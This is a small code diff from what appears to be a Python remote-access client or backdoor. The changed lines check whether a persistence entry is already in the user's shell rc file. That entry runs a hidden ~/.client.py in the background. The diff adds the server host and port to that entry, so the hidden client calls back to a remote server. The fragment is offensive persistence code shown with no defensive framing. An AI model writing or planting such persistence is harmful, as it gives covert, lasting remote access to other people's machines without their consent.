@@ -61,7 +61,7 @@ try:
 
     #Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
     with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
-        if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
+        if f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n" not in file:
             MAKE_PERSISTENT = True
         else:
             MAKE_PERSISTENT = False
